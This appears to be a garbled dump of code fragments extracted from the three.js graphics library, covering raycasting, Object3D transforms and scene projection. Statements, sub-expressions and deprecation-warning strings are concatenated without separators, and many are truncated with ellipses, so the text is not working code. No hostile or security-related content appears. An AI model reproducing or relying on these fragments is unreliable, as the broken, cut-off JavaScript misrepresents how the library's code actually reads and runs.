1listene ... x, 1 );listene ... ex, 1 )listenerArray.splicedispatc ... }\r\n\r\n\t}{\r\n\t\t\t\r ... }\r\n\r\n\t}listene ... .type ]event.typeevent.target = this;event.target = thisvar array = [];array = []var len ... length;listenerArray.lengtharray[  ... y[ i ];array[  ... ay[ i ]array[ i ]listenerArray[ i ]array[  ... vent );array[  ... event )array[ i ].call( funct ... EE ) );( funct ... REE ) )functio ... THREE ){\r\n\r\n\tT ... };\r\n\r\n}THREE.R ... \r\n\r\n\t};THREE.R ... ;\r\n\r\n\t}THREE.Raycasterthis.ra ... tion );this.ra ... ction )this.raynew THR ... ction )this.ne ... r || 0;this.ne ... ar || 0this.nearnear || 0this.fa ... finity;this.fa ... nfinitythis.farfar || Infinityvar loc ... .Ray();localRa ... E.Ray()var fac ... lane();facePla ... Plane()var int ... tor3();interse ... ctor3()var mat ... tor3();matrixP ... ctor3()var inv ... rix4();inverse ... trix4()var des ... \r\n\r\n\t};descSor ... ;\r\n\r\n\t}return  ... stance;a.dista ... istancea.distanceb.distancevar vA  ... tor3();vA = ne ... ctor3()var vB  ... tor3();vB = ne ... ctor3()var vC  ... tor3();vC = ne ... ctor3()var int ... \r\n\r\n\t};interse ... }\r\n\r\n\t}if ( ob ... \r\n\r\n\t\t}object  ... .SpriteTHREE.SpritematrixP ... orld );matrixP ... World )matrixP ... ositionvar dis ... tion );distanc ... ition )raycast ... ition )raycast ... ToPointraycaster.raydistanc ... scale.xobject.scale.xobject.scalereturn intersects;interse ... \t\t\t} );interse ... \n\t\t\t} )intersects.pushdistance: distancepoint:  ... ositionobject.positionface: nullobject: objectobject  ... REE.LODTHREE.LODraycast ... tanceToraycaster.ray.origininterse ... ects );interse ... sects )object. ... tance )object. ... istanceobject  ... EE.Meshif ( ra ... \n\r\n\t\t\t}raycast ... = falseraycast ... phere )raycast ... nSphereinverse ... orld );inverse ... World )inverse ... InverselocalRa ... trix );localRa ... atrix )localRa ... Matrix4localRa ... r.ray )localRay.copyif ( ge ... \n\r\n\t\t\t}geometry.boundingBoxif ( lo ... \r\n\t\t\t\t}localRa ... = falselocalRa ... ngBox )localRa ... tionBoxTHREE.BufferGeometryvar mat ... terial;materia ... aterialobject.materialif ( ma ... rsects;materia ... definedvar att ... ibutes;attribu ... ributesgeometry.attributesvar a, b, c;var pre ... cision;precisi ... ecisionraycaster.precisionif ( at ... \r\n\t\t\t\t}attribu ... definedattributes.indexvar ind ... .array;indices ... x.arrayattribu ... x.arrayvar pos ... .array;positio ... n.arrayattribu ... n.arrayattributes.positionvar off ... ffsets;offsets ... offsetsgeometry.offsetsif ( of ... \n\t\t\t\t\t}offsets.length === 0offsets.lengthoffsets ...  0 } ];offsets ... : 0 } ][ { sta ... : 0 } ]{ start ... ex: 0 }start: 0count:  ... .lengthpositions.lengthoi < ol++oivar oi  ... .lengthoi = 0ol = offsets.lengthvar sta ... .start;start = ... ].startoffsets[ oi ].startoffsets[ oi ]var cou ... .count;count = ... ].countoffsets[ oi ].countvar ind ... .index;index = ... ].indexoffsets[ oi ].indexfor ( v ... \t\t\t\t\t\t}var i = ... + counti = startil = start + countstart + count{\r\n\r\n\t\t ... \t\t\t\t\t\t}a = ind ... s[ i ];a = ind ... es[ i ]index + indices[ i ]indices[ i ]b = ind ...  + 1 ];b = ind ... i + 1 ]index + ... i + 1 ]indices[ i + 1 ]c = ind ...  + 2 ];c = ind ... i + 2 ]index + ... i + 2 ]indices[ i + 2 ]i + 2vA.set( ... \t\t\t\t\t);vA.set( ... \t\t\t\t\t\t)vA.setpositions[ a * 3 ]a * 3positio ... 3 + 1 ]a * 3 + 1positio ... 3 + 2 ]a * 3 + 2vB.set( ... \t\t\t\t\t);vB.set( ... \t\t\t\t\t\t)vB.setpositions[ b * 3 ]b * 3b * 3 + 1b * 3 + 2vC.set( ... \t\t\t\t\t);vC.set( ... \t\t\t\t\t\t)vC.setpositions[ c * 3 ]c * 3c * 3 + 1c * 3 + 2if ( ma ... \t\t\t\t\t\t}materia ... ackSidematerial.side{\r\n\t\t\t\t ... \t\t\t\t\t\t}var int ... true );interse ...  true )localRa ...  true )localRa ... rianglevar int ... Side );interse ... eSide )localRa ... eSide )materia ... bleSideif ( in ... ntinue;interse ... == nullinterse ... orld );interse ... World )interse ... Matrix4var dis ... oint );distanc ... Point )raycast ... Point )if ( di ... ntinue;distanc ... ter.fardistanc ... er.neardistance < precisionraycaster.nearraycaster.farinterse ... \t\t\t\t} )point:  ... onPointindices: [a, b, c][a, b, c]faceIndex: nullil = at ... .lengthattribu ... .lengtha = i;a = ib = i + 1;b = i + 1c = i + 2;c = i + 2THREE.Geometryvar isF ... terial;isFaceM ... aterialobject. ... aterialTHREE.M ... aterialvar obj ... : null;objectM ...  : nullisFaceM ...  : nullisFaceM ... == trueobject. ... terialsvar a, b, c, d;geometry.verticesfor ( v ... \r\n\t\t\t\t}f < flf ++var f = ... .lengthf = 0fl = ge ... .lengthgeometr ... .lengthgeometry.facesvar fac ... s[ f ];face =  ... es[ f ]geometry.faces[ f ]objectM ... Index ]face.materialIndexif ( ma ... ntinue;a = ver ... ce.a ];a = ver ... ace.a ]vertices[ face.a ]face.ab = ver ... ce.b ];b = ver ... ace.b ]vertices[ face.b ]face.bc = ver ... ce.c ];c = ver ... ace.c ]vertices[ face.c ]face.cif ( ma ... \n\t\t\t\t\t}materia ... == truemateria ... Targetsvar mor ... argets;morphTa ... Targetsgeometr ... Targetsvar mor ... uences;morphIn ... luencesobject. ... luencesmorphTa ... luencesvA.set( 0, 0, 0 );vA.set( 0, 0, 0 )vB.set( 0, 0, 0 );vB.set( 0, 0, 0 )vC.set( 0, 0, 0 );vC.set( 0, 0, 0 )t < tlt ++var t = ... .lengtht = 0tl = mo ... .lengthmorphTargets.lengthvar inf ... s[ t ];influen ... es[ t ]morphInfluences[ t ]influence === 0var tar ... rtices;targets ... erticesmorphTa ... erticesmorphTargets[ t ]vA.x += ... luence;vA.x += ... fluencevA.x( targe ... fluence( targe ... - a.x )targets ... x - a.xtargets[ face.a ].xtargets[ face.a ]vA.y += ... luence;vA.y += ... fluencevA.y( targe ... - a.y )targets ... y - a.ytargets[ face.a ].yvA.z += ... luence;vA.z += ... fluencevA.z( targe ... - a.z )targets ... z - a.ztargets[ face.a ].zvB.x += ... luence;vB.x += ... fluencevB.x( targe ... - b.x )targets ... x - b.xtargets[ face.b ].xtargets[ face.b ]vB.y += ... luence;vB.y += ... fluencevB.y( targe ... - b.y )targets ... y - b.ytargets[ face.b ].yvB.z += ... luence;vB.z += ... fluencevB.z( targe ... - b.z )targets ... z - b.ztargets[ face.b ].zvC.x += ... luence;vC.x += ... fluencevC.x( targe ... - c.x )targets ... x - c.xtargets[ face.c ].xtargets[ face.c ]c.xvC.y += ... luence;vC.y += ... fluencevC.y( targe ... - c.y )targets ... y - c.ytargets[ face.c ].yc.yvC.z += ... luence;vC.z += ... fluencevC.z( targe ... - c.z )targets ... z - c.ztargets[ face.c ].zc.zvA.add( a );vA.add( a )vA.addvB.add( b );vB.add( b )vB.addvC.add( c );vC.add( c )vC.adda = vA;a = vAb = vB;b = vBc = vC;c = vC{\r\n\t\t\t\t ... \n\t\t\t\t\t}face: facefaceIndex: fobject  ... EE.LineTHREE.Lineraycast ... ecisionvar nbV ... length;nbVerti ... .lengthinterSe ... ctor3()interRa ... ctor3()var ste ...  1 : 2;step =  ... ? 1 : 2object. ... ? 1 : 2object. ... neStripobject.typeTHREE.LineStripi < nbVertices - 1nbVertices - 1i = i + stepi + stepvar dis ... ment );distSq  ... gment )localRa ... gment )localRa ... Segmentvertices[ i + 1 ]distSq > precisionSqvar dis ... rRay );distanc ... erRay )localRa ... erRay )localRa ... tanceTolocalRay.originpoint:  ... World )interSe ... World )interSe ... Matrix4interSegment.clone()interSegment.clonevar int ... \t}\r\n\t};interse ... \t\t}\r\n\t}functio ... \t\t}\r\n\t}{\r\n\r\n\t\t ... \t\t}\r\n\t}var des ... ants();descend ... dants()object. ... dants()object. ... endantsl = des ... .lengthdescendants.lengthdescendants[ i ]THREE.R ... 0.0001;THREE.R ...  0.0001THREE.R ... ecisionTHREE.R ... on = 1;THREE.R ... ion = 1THREE.R ... )\r\n\r\n\t}THREE.R ... ype.setfunctio ... )\r\n\r\n\t}{\r\n\r\n\t\t ... )\r\n\r\n\t}this.ray.setTHREE.R ... tObjectvar intersects = [];intersects = []recursive === trueinterse ... Sort );interse ... cSort )intersects.sortTHREE.R ... Objectsl = objects.lengthobjects.lengthobjects[ i ]if ( re ... \n\r\n\t\t\t}THREE.O ... };\r\n\r\n}THREE.Object3Dthis.id ... unt ++;this.id ... ount ++THREE.O ... ount ++THREE.O ... IdCountthis.uu ... UUID();this.uu ... eUUID()this.uuidTHREE.M ... eUUID()THREE.M ... ateUUIDthis.name = '';this.name = ''this.namethis.pa ... efined;this.pa ... definedthis.parentthis.children = [];this.children = []this.childrenthis.up ... 1, 0 );this.up ...  1, 0 )this.upnew THR ...  1, 0 )this.po ... tor3();this.po ... ctor3()this.positionObject. ... \r\n\t} );Object. ... }\r\n\t} ){\r\n\t\tro ... \t\t}\r\n\t}rotatio ...  )\r\n\t\t}{\r\n\t\t\te ...  )\r\n\t\t}enumerable: truevalue:  ... \n\t\t\t} )new THR ... \n\t\t\t} )new THR ... nChangenew THREE.Euler()functio ... ;\r\n\t\t\t}scope.q ... alse );scope.q ... false )scope.q ... omEulerscope.quaternionscope.rotationquatern ...  )\r\n\t\t}scope.r ... alse );scope.r ... false )scope.r ... ternionscale:  ...  )\r\n\t\t}value:  ...  1, 1 )new THR ...  1, 1 )this.re ... = null;this.re ...  = nullthis.renderDepththis.ro ... = true;this.ro ...  = truethis.ro ... oUpdatethis.ma ... rix4();this.ma ... trix4()this.matrixthis.matrixWorldthis.ma ... = true;this.ma ...  = truethis.ma ... oUpdatethis.ma ...  false;this.ma ... = falsethis.ma ... sUpdatematrixW ... sUpdatethis.visible = true;this.visible = truethis.visiblethis.ca ...  false;this.ca ... = falsethis.castShadowthis.receiveShadowthis.fr ... = true;this.fr ...  = truethis.frustumCulledthis.userData = {};this.userData = {}THREE.O ... }\r\n\r\n};THREE.O ... \t}\r\n\r\n}constru ... bject3Dget eul ... ;\r\n\r\n\t}console ... er.' );console ... der.' )'DEPREC ... order.'DEPRECATED: Object3D's .eulerOrder has been moved to Object3D's .rotation.order.DEPRECATED: Object3D's eulerOrder has been moved to Object3D's return  ... .order;this.rotation.orderthis.rotationset eul ... ;\r\n\r\n\t}this.ro ...  value;this.ro ... = valueget use ... ;\r\n\r\n\t}console ... lt.' );console ... ult.' )'DEPREC ... fault.'DEPRECATED: Object3D's .useQuaternion has been removed. The library now uses quaternions by default.useQuaternion has been removed The library now uses quaternions by defaultset use ... ;\r\n\r\n\t}this.ma ... trix );this.ma ... atrix )this.ma ... atricesthis.ma ... cale );this.ma ... scale )this.ma ... composethis.quaternionsetRota ... isAnglethis.qu ... ngle );this.qu ... angle )this.qu ... isAnglethis.qu ... true );this.qu ...  true )this.qu ... omEulersetRota ... mMatrixthis.qu ... x( m );this.qu ... ix( m )this.qu ... nMatrixthis.qu ... y( q );this.qu ... py( q )this.quaternion.copyrotateO ... \n\r\n\t}()var q1  ... nion();q1 = ne ... rnion()q1.setF ... ngle );q1.setF ... angle )q1.setFromAxisAnglethis.qu ... ( q1 );this.qu ... y( q1 )this.qu ... ultiplyrotateX ... \n\r\n\t}()var v1  ... 0, 0 );v1 = ne ...  0, 0 )return  ... ngle );this.ro ... angle )this.rotateOnAxisrotateY ... \n\r\n\t}()var v1  ... 1, 0 );v1 = ne ...  1, 0 )rotateZ ... \n\r\n\t}()var v1  ... 0, 1 );v1 = ne ...  0, 1 )transla ... \n\r\n\t}()v1.copy( axis );v1.copy( axis )v1.appl ... nion );v1.appl ... rnion )v1.applyQuaternionthis.po ... ce ) );this.po ... nce ) )this.position.addv1.mult ... tance )v1.multiplyScalarconsole ... ged.' )'DEPREC ... anged.'DEPRECATED: Object3D's .translate() has been removed. Use .translateOnAxis( axis, distance ) instead. Note args have been changed.( axis, distance ) axis, distance  Note args have been changedreturn  ... ance );this.tr ... tance )this.translateOnAxislocalTo ... ;\r\n\r\n\t}return  ... orld );vector. ... World )worldTo ... \n\r\n\t}()var m1  ... rix4();m1 = ne ... trix4()return  ... ld ) );vector. ... rld ) )m1.getI ... World )m1.getInversem1.look ... s.up );m1.look ... is.up )m1.lookAtthis.qu ... ( m1 );this.qu ... x( m1 )add: fu ... }\r\n\r\n\t}object === thisconsole ... lf.' );console ... elf.' )'THREE. ... tself.'THREE.Object3D.add: An object can't be added as a child of itself.add: An object can't be added as a child of itselfobject  ... bject3Dif ( ob ... \n\r\n\t\t\t}object. ... definedobject.parentobject. ... ject );object. ... bject )object.parent.removeobject. ... = this;object.parent = thisobject. ... d' } );object. ... ed' } ){ type: 'added' }type: 'added'addedthis.ch ... ject );this.ch ... bject )this.children.pushvar scene = this;scene = thiswhile ( ... \n\r\n\t\t\t}scene.p ... definedscene.parentscene = ... parent;scene = scene.parentif ( sc ... \n\r\n\t\t\t}scene ! ... E.Scenescene !== undefinedscene i ... E.Scenescene._ ... ject );scene._ ... bject )scene.__addObjectremove: ... }\r\n\r\n\t}var ind ... ject );index = ... bject )this.ch ... indexOfif ( in ... \r\n\r\n\t\t}object. ... efined;{ type: 'removed' }type: 'removed'removedthis.ch ... x, 1 );this.ch ... ex, 1 )this.children.splicescene.__removeObjecttravers ... }\r\n\r\n\t}callback( this );callback( this )this.children.lengththis.ch ... back );this.ch ... lback )this.ch ... raversethis.children[ i ]getObje ... ;\r\n\r\n\t}var chi ... n[ i ];child = ... en[ i ]if ( ch ... \n\r\n\t\t\t}child.id === idchild.idreturn child;child = ... sive );child = ... rsive )child.g ... rsive )child.getObjectByIdif ( ch ... \r\n\t\t\t\t}child !== undefinedchild.name === namechild.namechild.g ... tByNamegetChil ... ;\r\n\r\n\t}console ... e().' )'DEPREC ... ame().'DEPRECATED: Object3D's .getChildByName() has been renamed to .getObjectByName().return  ... sive );this.ge ... rsive )this.getObjectByNamegetDesc ... ;\r\n\r\n\t}if ( ar ... y = [];array === undefinedarray = [];Array.p ... dren );Array.p ... ldren )Array.p ... h.applythis.ch ... rray );this.ch ... array )this.ch ... endantsupdateM ... ;\r\n\r\n\t}this.matrix.composeupdateM ... }\r\n\r\n\t}if ( th ... trix();this.ma ... == truethis.updateMatrix();this.updateMatrix()this.updateMatrixforce === truethis.ma ... ld.copythis.pa ... ixWorldforce = true;force = truethis.ch ... orce );this.ch ... force )this.ch ... ixWorldif ( ob ... ct3D();object === undefinedobject  ... ct3D();object  ... ect3D()new THREE.Object3D()if ( re ... = true;recursi ... definedrecursive = true;recursive = trueobject. ... s.name;object. ... is.nameobject.nameobject. ... s.up );object. ... is.up )object.up.copyobject.upobject. ... tion );object. ... ition )object.position.copyobject. ... nion );object. ... rnion )object. ... on.copyobject.quaternionobject. ... cale );object. ... scale )object.scale.copyobject. ... rDepth;object. ... erDepthobject.renderDepthobject. ... Update;object. ... oUpdateobject. ... trix );object. ... atrix )object.matrix.copyobject.matrixobject. ... orld );object. ... World )object. ... ld.copyobject. ... sUpdateobject. ... isible;object. ... visibleobject.visibleobject. ... Shadow;object. ... tShadowobject.castShadowobject. ... eShadowobject.receiveShadowobject. ... Culled;object. ... mCulledobject.frustumCulledobject. ... ta ) );object. ... ata ) )object.userDataJSON.pa ... ata ) )JSON.st ... rData )object. ... ne() );object. ... one() )object.addchild.clone()child.clonereturn object;THREE.E ... type );THREE.E ... otype )THREE.E ... e.applyTHREE.O ... nt = 0;THREE.O ... unt = 0THREE.Projectorvar _ob ... tor4();_objectPool = []_object ... gth = 0_vertexPool = []_vertex ... gth = 0_facePool = []_facePoolLength = 0_linePool = []_linePoolLength = 0_spritePool = []_sprite ... gth = 0_render ... s: [] }{ objec ... s: [] }objects: []lights: []elements: []_vA = n ... ctor3()_vB = n ... ctor3()_vC = n ... ctor3()_vector ... ctor3()_vector ... ctor4()_clipBo ... , 1 ) )new THR ... , 1 ) )new THR ... 1, -1 )_boundi ... .Box3()_points ... ay( 3 )new Array( 3 )_points ... ay( 4 )new Array( 4 )_viewMa ... trix4()_viewPr ... trix4()_viewPr ... nMatrix_modelV ... trix4()_modelV ... nMatrix_normal ... trix3()_frustu ... ustum()_clippe ... ctor4()_clippe ... nScreenthis.pr ... \r\n\r\n\t};this.pr ... ;\r\n\r\n\t}this.projectVectorcamera. ... orld );camera. ... World )camera. ... Inversecamera.matrixWorld_viewPr ... erse );_viewPr ... verse )_viewPr ... atricescamera. ... nMatrixvector. ... atrix )this.un ... \r\n\t}();this.un ... \n\r\n\t}()this.unprojectVectorvar pro ... rix4();project ... trix4()project ... Inverseproject ... trix );project ... atrix )this.pi ... \r\n\r\n\t};this.pi ... ;\r\n\r\n\t}this.pickingRayvector.z = -1.0;vector.z = -1.0vector.z-1.0var end ...  1.0 );end = n ... , 1.0 )new THR ... , 1.0 )vector.xvector.ythis.un ... mera );this.un ... amera )end.sub ... lize();end.sub ... alize()end.sub ... rmalizeend.sub( vector )end.subreturn  ...  end );new THR ... , end )var pro ... \r\n\r\n\t};project ... }\r\n\r\n\t}if ( ob ... return;object. ... = falseobject  ... E.LightTHREE.Light_render ... ject );_render ... bject )_render ... ts.push_renderData.lightsobject. ... == true_frustu ... == true_frustu ... bject )_frustu ... sObject_object ... Pool();_object ... nPool()getNext ... nPool()_object ... ect.id;_object ... ject.id_object.idobject.id_object ... object;_object ...  object_object.objectif ( ob ... \r\n\t\t\t\t}object. ... == null_object ... rDepth;_object ... erDepth_object.z_vector ... orld );_vector ... World )_vector ... osition_vector ... trix );_vector ... atrix )_vector ... jection_object ... tor3.z;_object ... ctor3.z_vector3.z_renderData.objectsl = obj ... .lengthobject. ... .lengthobject.childrenproject ...  i ] );project ... [ i ] )object.children[ i ]_objectCount = 0;_objectCount = 0_render ... th = 0;_render ... gth = 0_render ... .lengthproject ... root );project ...  root )if ( so ... \r\n\r\n\t\t}sortObjects === true_render ... Sort );_render ... rSort )_render ... ts.sortvar Ren ... \r\n\r\n\t};RenderL ... }\r\n\r\n\t}var normals = [];normals = []var uvs = [];uvs = []var object = null;object = nullvar material = null;material = nullvar nor ... rix3();normalM ... trix3()var set ... \n\r\n\t\t};setObje ... \r\n\r\n\t\t}object = value;object = valuemateria ... terial;normalM ... orld );normalM ... World )normalM ... lMatrixnormals.length = 0;normals.length = 0normals.lengthuvs.length = 0;uvs.length = 0uvs.lengthvar pro ... \n\r\n\t\t};project ... \r\n\r\n\t\t}vertex.positionvar pos ... nWorld;positio ... onWorldvertex.positionWorldvar pos ... Screen;positio ... nScreenvertex. ... nScreenpositio ... trix );positio ... atrix )positio ... Matrix4positio ... ition )positionWorld.copypositio ... World )positionScreen.copyvar inv ... reen.w;invW =  ... creen.w1 / positionScreen.wpositionScreen.wpositio ... = invW;positio ... *= invWpositionScreen.xpositionScreen.ypositionScreen.zvertex. ... z <= 1;vertex. ... .z <= 1vertex.visiblepositio ... .z <= 1positio ... z >= -1positio ... .y <= 1positio ... y >= -1positio ... .x <= 1positio ... x >= -1var pus ... \n\r\n\t\t};pushVer ... \r\n\r\n\t\t}_vertex ... Pool();_vertex ... nPool()_vertex ... y, z );_vertex ...  y, z )_vertex.position.set_vertex.positionproject ... rtex );project ... ertex )pushNor ... \r\n\r\n\t\t}normals ... y, z );normals ...  y, z )normals.pushpushUv  ... \r\n\r\n\t\t}uvs.push( x, y );uvs.push( x, y )uvs.pushvar che ... \n\r\n\t\t};checkTr ... \r\n\r\n\t\t}checkTr ... ibilityif ( v1 ... n true;v1.visi ... == truev1.visible === truev1.visiblev2.visible === truev2.visiblev3.visible === truev3.visible_points ... Screen;_points ... nScreen_points3[ 0 ]v1.positionScreen_points3[ 1 ]v2.positionScreen_points3[ 2 ]v3.positionScreenreturn  ... s3 ) );_clipBo ... ts3 ) )_clipBo ... tionBox_boundi ... ints3 )_boundi ... mPointscheckBa ... \r\n\r\n\t\t}return  ...  ) < 0;( ( v3. ... ) ) < 0( ( v3. ... n.x ) )( v3.po ... een.x )( v3.po ... een.y )v3.posi ... creen.xv3.positionScreen.xv1.positionScreen.x( v2.po ... een.y )v2.posi ... creen.yv2.positionScreen.yv1.positionScreen.yv3.posi ... creen.yv3.positionScreen.y( v2.po ... een.x )v2.posi ... creen.xv2.positionScreen.xpushLin ... \r\n\r\n\t\t}var v1  ... l[ a ];v1 = _v ... ol[ a ]_vertexPool[ a ]var v2  ... l[ b ];v2 = _v ... ol[ b ]_vertexPool[ b ]_line = ... Pool();_line = ... nPool()getNextLineInPool()_line.i ... ect.id;_line.id = object.id_line.id_line.v1.copy( v1 );_line.v1.copy( v1 )_line.v1.copy_line.v1_line.v2.copy( v2 );_line.v2.copy( v2 )_line.v2.copy_line.v2_line.z ...  ) / 2;_line.z ... z ) / 2_line.z( v1.po ... z ) / 2( v1.po ... een.z )v1.posi ... creen.zv1.positionScreen.zv2.positionScreen.z_line.m ... terial;_line.m ... aterial_line.material_render ... line );_render ... _line )_renderData.elementspushTri ... \r\n\r\n\t\t}var v3  ... l[ c ];v3 = _v ... ol[ c ]_vertexPool[ c ]if ( ch ... return;checkTr ... = falsecheckTr ... 2, v3 )if ( ma ... \n\r\n\t\t\t}checkBa ... == truecheckBa ... 2, v3 )_face = ... Pool();_face = ... nPool()getNextFaceInPool()_face.i ... ect.id;_face.id = object.id_face.id_face.v1.copy( v1 );_face.v1.copy( v1 )_face.v1.copy_face.v1_face.v2.copy( v2 );_face.v2.copy( v2 )_face.v2.copy_face.v2_face.v3.copy( v3 );_face.v3.copy( v3 )_face.v3.copy_face.v3_face.z ...  ) / 3;_face.z ... z ) / 3_face.z( v1.po ... z ) / 3v3.positionScreen.zi < 3var off ...  ] * 3;offset  ... i ] * 3arguments[ i ] * 3arguments[ i ]var nor ... l[ i ];normal  ... el[ i ]_face.v ... el[ i ]_face.v ... lsModelnormal. ...  2 ] );normal. ... + 2 ] )normal.setnormals[ offset ]normals ... t + 1 ]normals ... t + 2 ]normal. ... lize();normal. ... alize()normal. ... rmalizenormal. ... atrix )normal.applyMatrix3var off ...  ] * 2;offset2 ... i ] * 2arguments[ i ] * 2var uv  ... s[ i ];uv = _face.uvs[ i ]_face.uvs[ i ]_face.uvsuv.set( ...  1 ] );uv.set( ... + 1 ] )uv.setuvs[ offset2 ]uvs[ offset2 + 1 ]offset2 + 1_face.v ... th = 3;_face.v ... gth = 3_face.v ... sLength_face.m ... terial;_face.m ... aterial_face.material_render ... face );_render ... _face )return  ... le\r\n\t\t}{\r\n\t\t\ts ... le\r\n\t\t}setObject: setObjectproject ... tVertexcheckBa ... CullingpushVer ... hVertexpushNor ... hNormalpushUv: pushUvpushLine: pushLinepushTri ... rianglevar ren ... List();renderL ... rList()new RenderList()this.projectScenevar obj ... erials;_faceCount = 0;_faceCount = 0_lineCount = 0;_lineCount = 0_spriteCount = 0;_spriteCount = 0if ( sc ... orld();scene.a ... == truescene.autoUpdatescene.u ... orld();scene.u ... World()scene.u ... ixWorldif ( ca ... orld();camera. ... definedcamera.parentcamera. ... orld();camera. ... World()camera. ... ixWorld_viewMa ... ld ) );_viewMa ... rld ) )_viewMatrix.copy_viewPr ... trix );_viewPr ... atrix )_frustu ... trix );_frustu ... atrix )_frustu ... mMatrixproject ... ects );project ... jects )o < olo ++var o = ... .lengtho = 0ol = _r ... .lengthobject  ... object;object  ... .object_render ... .object_render ... ts[ o ]geometr ... ometry;renderL ... ject );renderL ... bject )renderList.setObject_modelM ... xWorld;_modelM ... ixWorld_vertexCount = 0;_vertexCount = 0if ( ge ... \r\n\t\t\t\t}if ( at ... ntinue;l = positions.lengthrenderL ...  2 ] );renderL ... + 2 ] )renderL ... hVertexpositions[ i ]positions[ i + 1 ]positions[ i + 2 ]if ( at ... \n\t\t\t\t\t}attributes.normalvar nor ... .array;normals ... l.arrayattribu ... l.arrayl = normals.lengthrenderL ... hNormalnormals[ i ]normals[ i + 1 ]normals[ i + 2 ]attributes.uvvar uvs ... .array;uvs = a ... v.arrayattributes.uv.arrayi += 2l = uvs.lengthrenderL ...  1 ] );renderL ... + 1 ] )renderList.pushUvuvs[ i ]uvs[ i + 1 ]if ( of ... \t\t\t\t\t\t}offsets.length > 0o < offsets.lengthvar o = 0var off ... s[ o ];offset  ... ts[ o ]offsets[ o ]index = offset.indexoffset.indexvar i = ... t.counti = offset.startoffset.startl = off ... t.countoffset. ... t.countoffset.countrenderL ... ndex );renderL ... index )renderL ... riangleindices[ i ] + indexindices ... + indexl = indices.lengthindices.lengthvar i = ... gth / 3l = pos ... gth / 3positions.length / 3renderL ...  + 2 );renderL ... i + 2 )vertice ... rtices;faces = ... .faces;faces = ... y.facesfaceVer ... s[ 0 ];faceVer ... vs[ 0 ]geometr ... vs[ 0 ]geometr ... rtexUvs_normal ... trix );_normal ... atrix )_normal ... lMatrixisFaceM ... terial;objectM ... : null;v < vlv ++var v = ... .lengthv = 0vl = vertices.lengthvar ver ... s[ v ];vertex  ... es[ v ]vertices[ v ]renderL ... ex.z );renderL ... tex.z )vertex.xvertex.yvertex.zfl = faces.lengthfaces.lengthface = faces[ f ];face = faces[ f ]faces[ f ]objectM ... terialsvar sid ... l.side;side = material.sidevar v1  ... ce.a ];v1 = _v ... ace.a ]_vertex ... ace.a ]var v2  ... ce.b ];v2 = _v ... ace.b ]_vertex ... ace.b ]var v3  ... ce.c ];v3 = _v ... ace.c ]_vertex ... ace.c ]var v1p ... sition;v1p = v1.positionv1.positionvar v2p ... sition;v2p = v2.positionv2.positionvar v3p ... sition;v3p = v3.positionv3.position_vA.set( 0, 0, 0 );_vA.set( 0, 0, 0 )_vA.set_vB.set( 0, 0, 0 );_vB.set( 0, 0, 0 )_vB.set_vC.set( 0, 0, 0 );_vC.set( 0, 0, 0 )_vC.set_vA.x + ... luence;_vA.x + ... fluence_vA.x( targe ... v1p.x )targets ... - v1p.xv1p.x_vA.y + ... luence;_vA.y + ... fluence_vA.y( targe ... v1p.y )targets ... - v1p.yv1p.y_vA.z + ... luence;_vA.z + ... fluence_vA.z( targe ... v1p.z )targets ... - v1p.zv1p.z_vB.x + ... luence;_vB.x + ... fluence_vB.x( targe ... v2p.x )targets ... - v2p.xv2p.x_vB.y + ... luence;_vB.y + ... fluence_vB.y( targe ... v2p.y )targets ... - v2p.yv2p.y_vB.z + ... luence;_vB.z + ... fluence_vB.z( targe ... v2p.z )targets ... - v2p.zv2p.z_vC.x + ... luence;_vC.x + ... fluence_vC.x( targe ... v3p.x )targets ... - v3p.xv3p.x_vC.y + ... luence;_vC.y + ... fluence_vC.y( targe ... v3p.y )targets ... - v3p.yv3p.y_vC.z + ... luence;_vC.z + ... fluence_vC.z( targe ... v3p.z )targets ... - v3p.zv3p.zv1.posi ...  _vA );v1.posi ... ( _vA )v1.position.addv2.posi ...  _vB );v2.posi ... ( _vB )v2.position.addv3.posi ...  _vC );v3.posi ... ( _vC )v3.position.addrenderL ... ( v1 );renderL ... x( v1 )renderL ... tVertexrenderL ... ( v2 );renderL ... x( v2 )renderL ... ( v3 );renderL ... x( v3 )if ( re ... ntinue;renderL ... = falserenderL ... 2, v3 )renderL ... ibilityvar vis ... , v3 );visible ... 2, v3 )renderL ... Cullingif ( si ... \t\t\t\t\t\t}side != ... bleSideif ( si ... ntinue;side == ... = falseside == ... ontSidevisible === falseside == ... == trueside == ... ackSidevisible === true_face.n ... rmal );_face.n ... ormal )_face.n ... el.copy_face.normalModelface.normalif ( vi ... \t\t\t\t\t\t}visible ... eSide )( side  ... eSide )side == ... bleSide_face.n ... gate();_face.n ... egate()_face.n ... .negate_face.n ... lize();_face.n ... alize()_face.n ... rmalize_face.n ... atrix )_face.n ... Matrix3faceVer ... ormals;faceVer ... Normalsface.vertexNormalsn < nln ++var n = ... th, 3 )n = 0nl = Ma ... th, 3 )Math.mi ... th, 3 )faceVer ... .lengthvar nor ... l[ n ];normalM ... el[ n ]_face.v ... el[ n ]normalM ...  n ] );normalM ... [ n ] )normalModel.copyfaceVer ... ls[ n ]normalM ... gate();normalModel.negate()normalModel.negatenormalM ... lize();normalM ... alize()normalM ... rmalizenormalM ... Matrix3_face.v ... length;_face.v ... .lengthvar ver ... s[ f ];vertexU ... vs[ f ]faceVertexUvs[ f ]if ( ve ... \t\t\t\t\t\t}vertexU ... definedu < 3u ++var u = 0u = 0_face.u ...  u ] );_face.u ... [ u ] )_face.uvs[ u ].copy_face.uvs[ u ]vertexUvs[ u ]_face.c ... .color;_face.c ... e.color_face.colorface.colorif ( at ... \t\t\t\t\t\t}renderList.pushLinevar i = ... 3 ) - 1l = ( p ... 3 ) - 1( posit ... 3 ) - 1( posit ... h / 3 )renderL ...  + 1 );renderL ... i + 1 )_modelV ... trix );_modelV ... atrix )_modelV ... atricesobject. ... erticesif ( ve ... ntinue;vertice ... h === 0v1 = ge ... Pool();v1 = ge ... nPool()v1.posi ... trix );v1.posi ... atrix )v1.posi ... Matrix4v1.posi ... [ 0 ] )v1.posi ... en.copyvertices[ 0 ]var ste ...  2 : 1;step =  ... ? 2 : 1object. ... ? 2 : 1object. ... ePiecesTHREE.LinePiecesv = 1v1.posi ... [ v ] )if ( (  ... ntinue;( v + 1 ) % step > 0( v + 1 ) % step( v + 1 )v + 1v2 = _v ...  - 2 ];v2 = _v ... t - 2 ]_vertex ... t - 2 ]_vertexCount - 2_clippe ... reen );_clippe ... creen )_clippe ... en.copyif ( cl ... \t\t\t\t\t\t}clipLin ... == trueclipLin ... creen )_clippe ... en.w );_clippe ... een.w )_clippe ... yScalar1 / _cl ... creen.w_clippe ... creen.w_line.v ... reen );_line.v ... creen )_line.v ... en.copy_line.v ... 